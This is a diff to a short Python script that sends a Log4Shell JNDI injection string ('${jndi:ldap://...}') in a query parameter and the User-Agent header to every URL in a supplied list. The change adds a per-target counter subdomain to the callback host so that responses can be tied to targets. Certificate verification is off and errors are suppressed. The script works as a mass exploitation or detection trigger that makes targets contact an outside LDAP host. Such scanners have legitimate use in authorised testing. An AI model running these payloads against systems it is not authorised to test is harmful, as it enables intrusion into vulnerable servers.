@@ -8,12 +8,14 @@ urllib3.disable_warnings()
 if len(argv) > 1:
     urlFile = open(argv[1], 'r')
     urls = urlFile.readlines()
+    count = 0
     for url in urls:
         try:
-            params = {'test': '${jndi:ldap://'+argv[2]+'/a}'}
-            headers = {'User-Agent': '${jndi:ldap://'+argv[2]+'/a}'}
+            count += 1
+            params = {'test': '${jndi:ldap://' + str(count) + '.' + argv[2] + '/a}'}
+            headers = {'User-Agent': '${jndi:ldap://' + str(count) + '.' + argv[2] + '/a}'}
             url = url.strip()
-            print('[!] Testing {}'.format(url))
+            print('[{}] Testing {}'.format(count, url))
             requests.get(url, headers=headers, params=params, verify=False, timeout=10)
         except:
             pass
